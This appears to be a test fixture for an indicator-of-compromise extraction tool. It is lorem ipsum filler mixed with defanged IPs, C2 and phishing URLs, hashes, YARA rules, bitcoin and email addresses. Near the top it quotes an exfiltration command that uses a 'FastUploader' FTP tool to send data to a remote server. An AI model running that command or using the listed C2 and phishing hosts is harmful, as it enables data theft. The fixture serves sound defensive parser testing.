@@ -1,0 +1,301 @@
+---
+title:Example report
+---
+
+ Lorem ipsum dolor sit amet, consectetur adipiscing elit. Fusce quis metus nec nisl finibus euismod eget at enim. Proin porta metus nec volutpat porttitor. Nam at sem rutrum, dignissim ligula eu, accumsan lacus. Nunc sed nibh pretium, placerat velit vel, varius eros. In ac mollis lacus. Vestibulum elementum egestas leo, at tincidunt urna varius sed. Integer sem neque, accumsan finibus urna vitae, sodales egestas erat. Suspendisse pharetra euismod mi quis efficitur. Duis vehicula tristique eleifend. In tincidunt elit vitae odio finibus, at maximus enim faucibus. Curabitur at rutrum libero. Morbi est lacus, tristique et tortor ut, vulputate mollis justo. Morbi sed felis elit. Vivamus luctus nisl nec quam iaculis, ut posuere tortor pulvinar. Donec gravida diam purus, eu laoreet eros scelerisque sollicitudin.
+
+192.119.15.36 880 hxxp://192.119.15[DOT]36:880/ftp.exe
+JsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\appdata\roaming\adobe\rar -a ftp://89.34.237.118:2020 -f /[REDACTED] -u
+FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to
+csidl_profile\appdata\roaming\adobe\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than
+
+
+
+Mauris iaculis vulputate gravida. Vivamus molestie lobortis facilisis. Interdum et malesuada fames ac ante ipsum primis in faucibus. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Suspendisse eget dui laoreet, suscipit leo ut, convallis felis. Curabitur vel ullamcorper enim. Donec iaculis pretium imperdiet. Cras consectetur mi sed nisi aliquet mattis sed non diam. Suspendisse sed justo feugiat, condimentum lectus quis, facilisis odio. Vivamus ut eros vel justo sodales faucibus vitae vel purus. Mauris eros enim, auctor et turpis in, aliquam vehicula neque. Mauris suscipit ante vel porttitor vestibulum. In sed mi at velit fringilla mollis. Maecenas vitae gravida arcu, quis rhoncus erat. Integer faucibus varius est, a consequat magna sollicitudin sit amet. 
+
+---
+
+# Whitelist
+
+https://securelist.com/
+https://blog.talosintelligence.com/
+https://www.welivesecurity.com/
+https://blog.yoroi.company/
+https://unit42.paloaltonetworks.com/
+https://blog.ensilo.com/
+https://www.intezer.com/
+https://www.secrss.com/
+https://medium.com/
+https://ti.qianxin.com/
+https://www.nytimes.com/
+https://research.checkpoint.com/
+https://blog.malwarebytes.com/
+
+---
+
+# Indicators of Compromise
+
+## IPv4
+
+### C&C
+
+0.0.0.0:
+255.255.255.255
+1.1.1.1
+172.16.43.1:0
+172.16.43.2:1234
+172.16.43.3:65535
+0[.]0[.]0[.]0
+1(.)2(.)3(.)4
+5\.6\.7\.8
+12.32.45[.]34
+121(.)32(.)34(.)34:543
+45\.66\.77\.98[:]423
+132.32.145[.]74(:)23
+42.42.42[DOT]42
+
+### Downloads
+
+9.8.7.6
+12.34.56.78:8080
+
+### Should not match
+
+256.256.256.256
+012.032.012.012
+
+### Should not match but do match, because we don't have a start bound on the regex
+
+9.9.9.9:055
+12313.123.43.233242
+
+---
+
+## URL
+
+hxxp://my-homework[.]890m[.]com/gnu/ver
+hxxp://kuku79[.]herobo[.]com/data/pod/fund.pas
+hxxp://aiyac-updaite[.]hol.es/Est/down/CoreWin32
+hxxp://my-homework.890m[.]com/bbs/data/board.php?v=a       Finished getting C2 URL
+hxxps://pastebin[.]com/raw/Gw7mywhC
+hxxps://paste[.]ee/r/bOZW3 contains another encrypted Assembly executable that is later
+service[.]serveftp[.]org
+amazo0n[.]serveftp[.]com/Data
+                   Rhubarb2.com           C2 server            IR'Sanan        +98.9303938251             Pilton86         6614478527
+                   Rhubarb3.com           C2 server            Privacy‐        PrivacyProtect             Privacy‐         PrivacyPro‐
+                         googleupdators.com
+
+         %SYSTEM32%\syssettings.ini                     hxxp://add3565office.com/rstr
+         %TEMP%\htpd.dat                                hxxp://officemysuppbox.com/staterepository
+allcoin.com,anxpro.com,big.one,mercatox.com,therocktrading.com,okcoin.com,bleutrade.com,exchange.btcc.com
+pcbancorp.com,schoolsﬁrstfcu.org,mbﬁnancial.com,natpennbank.com,fnbcorporation.com,fnfg.com,golden1.com
+
+engine.lanaurmi.com :3389
+
+images.andychroeder.com : 80
+
+     Net‐          dji-msi.2waky.com                                       External C2 domain; rotates with the others over time
+
+http://topmarkdobrasil.com.br/spokekfllfd/mail.htm?cmd=LOB=RBGLogon&_pageLabel=page_logonform&secured_page
+https://landes-berlin.com/de/kreditkarten2020/banking.lbb.de-lbb-cas/02/101010/7ef013d57c05b8b/d01944/bb100954.php?id=23603431&local=_&web=succes
+http://www.livingfreeintl.com/wp/www.loginalibaba.com/alibaba/alibaba/login.alibaba.com.php?email=jsmith@imaphost.com&amp;.rand=13vqcr8bp0gud&amp;lc=1033&amp;id=64855&amp;mkt=en-us&amp;cbcxt=mai&amp;snsc=1
+http://www.smbrowntech.com/B86/onedrive/onedrive/
+http://statwig.com/ss/DHL%20EXPRESS/login/index.php
+https://mail.teekycraftstore.com/wp-content/plugins/mailchimp-for-wp/includes/admin/a1/AbsaOnline.htm
+http://tcwrcgeneralcontractors.com/cgi/activity-126/
+http://foobar.com[/]dir
+http[:]//foobar.com
+hxxps://evil.com
+
+
+---
+
+## IP and URL mixed
+
+
+64.251.19.217   [REDACTED].myftp.org
+tcp://185[.]106[.]122[.]120:80                               C&C Server
+tcp://185[.]117[.]89[.]139:80
+tcp://169[.]239[.]128[.]186:80                               C&C Server (FlawedAmmyy RAT)
+tcp://185[.]117[.]89[.]145:80                                FlawedAmmyy
+tcp://185[.]117[.]89[.]145:80/
+
+---
+
+## Domains
+
+test.xn--bcher-kva
+
+
+---
+
+## Hashes
+
+c2c37c239e4674756f172dd577a92e25  Bad 1
+6a9e70ef2c6f80e9a238423bb5de87969ff7a6c3  Bad 2
+e9be8ea2768992d5aef8d9a4c1eb2f6dbe8cf26144aca4d050c53c86f978f856  Bad 3
+
+00819decaf4ec1aa85c14d857941c40f  More Bad 1
+19ff1a6b9b9508926924f6615535a2947cd68bd8  More Bad 2
+accd1828f82d19739ba34d4edd673ef52e26d8f53a1d0ff289b0e63f1a94ddc4  More Bad 3
+
+73a902cfd57431f1bd66fc07d84ca82e  Most Bad 1
+acaed10993141e5e56c0c67beebb7f88630d79ca  Most Bad 2
+d21f4fb406a49e94d56e63370ddfb2cd72231e69898203f8970a6db829cff7aa  Most Bad 3
+
+540e35e577113b0abb42fc63aba1944c
+
+Blah 1
+
+b40190a58001839d16c31ecee56c75da
+
+Blah 2
+
+74206fbd87b64efc1726776edffa5086
+
+Blah 3
+
+74616838a3a75a455d5241317e467752047bd852
+
+Foo 1
+
+4bc9b4a832c273b2d30218cdf04b2e8321ce8f8c
+
+Foo 2
+
+17bc0f34d4b4a65b9341d979e61871ab5b99c08d
+
+Foo 3
+
+af2a6fc1eff8a2c6c0610443f84a907bbb2d095e2c2cdfebb2df0b2e432d2b3f
+
+Qoo 1
+
+ad7c91849e4c352c918583c85bbd33c7d7c3338e886f8c8322a8d3fd7df36ac6
+
+Qoo 2
+
+8c8c8ac576e25d7f14c3adf8736a37ffa64038c61a39e30498e647f73e69028d
+
+Qoo 3
+
+
+48:2Qjg16flIET763fkoj8TjAfAqLVyEpI+KCw3mhKbeX:FjgolO38AfzLjxKi,"stdin"
+96:kBR7wwIWju5goYlRJ3u+jfPRWB4fdxkAP0eqo90XQdz5xl215Q:kBR7tIWKKR9RPR7dxkA8a90XQdcQ,"stdin"
+48:xMauN72EvZFuuGFolNzRqrFhGzucsu1y2+7aLmWqT9:xMYaZFLa2zRqrHCucg2+JZJ,"stdin"
+48:yaXsvbjcWsU0TevsAJILct3dnF30+gMMceKG7zztv:ya8vUNTeLIQt3jE+vMjKGxv,"stdin"
+96:dFt3uE24P/ocSdP1oGKn7JYKiVbrxb+dWDxyEa:Xh2Jh51odJYKiVMw0Ea,"stdin"
+1536:Gj3uA6Rx3YDicO0fZoNlQa10/KhGNAvHswAHW7n:guVfYDTOCUBGVNAE/S,"stdin"
+12288:KxVb14wvrLNINHO6TukFMdssZyPykI7ZL76MJ1S:4VxPXNIVOku4PxPykjMJg,"stdin"
+98304:mmPQI3b9gVqslClfs+2kDHgKbYLBAiT0nLxNgRLHxA+piYFGpmyEF9FgrvER:jQI3yVqslClfs+2gHMlTb5RRpMI9YvER,"stdin"
+1572864:eevp32d2gnaeEgG96exUi9JA4IDtZaC0f6Dwu9V1:tg2gb49qptZF0Csu9V1,"stdin"
+
+Ssdeep                    1536:sPNdY/P/r6aqTzN7gqJT/0vniPJiz3yUrvGkc+uylR:sPiz657gqJT/06xiT/vaVyl
+            ssdeep       48:yei1q9dBQSRiylw9c9V9LTra+iaiudupRCRvA9ufAuRa7T5XHPsV8icvOyp+++:tdBd‐
+  Fuzzy        : 6144:l2BrJZHpYjthdeDBriFX8gN7Fcp4bxKXKFpqKx:cBxYjNqBuSo504bxKXcp1x
+
+Create date: 2019:07:22 12:08:00 (GMT)
+Date: Thu, 29 Nov 2018 22:23:08 GMT
+63:66:a9:ac:97:df:4d:e1:73:66:94:3c:9b:29:1a:aa
+15:49:08
+17:08:40
+
+---
+
+## YARA rules
+
+### One
+
+```
+include "./includes/other.yar"
+include "../includes/other.yar"
+include "c:/yara/includes/other.yar"
+import "cuckoo"
+
+include "c:\\yara\\includes\\other.yar"
+import "pe" rule MetadataExample:test foobar blah
+{
+    meta:
+        my_identifier_1 = "Some } \" string data"
+        my_identifier_2 = 24
+        my_identifier_3 = true
+
+    strings:
+        $my_text_string = "text here"
+        $my_hex_string = { E2 34 /* } A1 */ C8 23 FB }
+        $a = {
+             E2 34
+             // FF } "foo"
+             E2 34 }
+
+    condition:
+        $my_text_string or $my_hex_string or $a
+}
+```
+
+
+### Other one
+
+```
+rule foo {
+	strings:
+		$a = "foobar" ascii wide fullword
+	condition:
+		all of them
+}
+```
+
+---
+
+## Bitcoin
+
+1KE1EqyKLPzLWQ3BhRz2g1MHh5nws2TRk
+163qcNngcPxk7njkBGU3GGtxdhi74ycqzk
+3HXdb3HAw1wVzU9b7ZSigvGaStd8KoZ3zJ
+
+    12We6HFUr6GmxrHu2GFKfPSLD16ki31Msf (made three inputs): received a total of US$5,297.32
+    1KiY2X9tww3zDgZmuoFRvZ7ssWx1b4moC9 (made two inputs): received a total of US$993.54
+    1CjZhStjKz95xqDEQ1PESygR2gKve8Yf7U (made two inputs): received a total of 7,748.92 USD
+    17QU3bzgqQZCs8wRCAmLqiRL4yytRKqVs3: received a total of US$4,672.65
+    12bYqKzCRJPhu75dP3NPtf6C2NX3dHAXiU: received a total of US$2,516.05
+    1FcCacS5pebEKMR6wtz7k98JEqbhfhCkDw: received a total of US$3,752.34
+    12i8q8K7apATJworX48SqQzNgiVmPpWGpz: received a total of US$2,490.25
+    1BDaStcRvbM3QJei5ZT1FxLRy7M7Jk3j1c: received a total of US$2,531.09
+    136NawuGLkuJwAWYwkCkCnBdE9U1e1fJhx: received a total of US$2,343.33
+
+
+---
+
+## Email
+
+test[at]example.com
+test[@]example.com
+test(@)example.com
+test@example[dot]com
+test@example(dot)com
+
+### Valid email addresses (from Wikipedia)
+
+    simple@example.com
+    very.common@example.com
+    disposable.style.email.with+symbol@example.com
+    other.email-with-hyphen@example.com
+    fully-qualified-domain@example.com
+    user.name+tag+sorting@example.com (may go to user.name@example.com inbox depending on mail server)
+    x@example.com (one-letter local-part)
+    example-indeed@strange-example.com
+    admin@mailserver1 (local domain name with no TLD, although ICANN highly discourages dotless email addresses)
+    example@s.example (see the List of Internet top-level domains)
+    " "@example.org (space between the quotes)
+    "john..doe"@example.org (quoted double dot)
+
+### Invalid email addresses (from Wikipedia)
+    Abc.example.com (no @ character)
+    A@b@c@example.com (only one @ is allowed outside quotation marks)
+    a"b(c)d,e:f;g<h>i[j\k]l@example.com (none of the special characters in this local-part are allowed outside quotation marks)
+    just"not"right@example.com (quoted strings must be dot separated or the only element making up the local-part)
+    this is"not\allowed@example.com (spaces, quotes, and backslashes may only exist when within quoted strings and preceded by a backslash)
+    this\ still\"not\\allowed@example.com (even if escaped (preceded by a backslash), spaces, quotes, and backslashes must still be contained by quotes)
+    1234567890123456789012345678901234567890123456789012345678901234+x@example.com (local part is longer than 64 characters)
+
+
